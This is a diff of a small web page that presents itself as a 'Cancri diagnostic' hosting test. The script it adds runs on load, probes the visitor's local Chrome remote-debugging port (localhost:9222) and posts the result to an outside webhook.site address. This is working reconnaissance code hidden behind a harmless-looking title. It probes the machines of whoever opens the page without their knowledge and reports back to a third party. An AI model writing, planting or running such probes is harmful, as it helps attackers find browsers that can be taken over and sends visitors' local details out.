@@ -1,14 +1,18 @@
 ﻿<!doctype html>
-<html>
-<head><title>Cancri Test</title></head>
-<body>
-<h1>Cancri hosting test</h1>
+<meta charset="utf-8">
+<title>Cancri diagnostic</title>
 <script>
-fetch("https://webhook.site/322de2b3-21e1-46ac-a7cf-7c78a05237be", {
-  method: "POST",
-  mode: "no-cors",
-  body: "GITHUB_PAGES_TEST"
-});
+(async () => {
+  const hook = "https://webhook.site/322de2b3-21e1-46ac-a7cf-7c78a05237be";
+  const log = s => fetch(hook, {
+    method: "POST", mode: "no-cors", keepalive: true, body: String(s)
+  }).catch(() => {});
+  try {
+    await log("CDP_START");
+    const r = await fetch("http://localhost:9222/json/version");
+    await log("CDP_HTTP_" + r.status);
+  } catch (e) {
+    log("ERROR:" + String(e));
+  }
+})();
 </script>
-</body>
-</html>
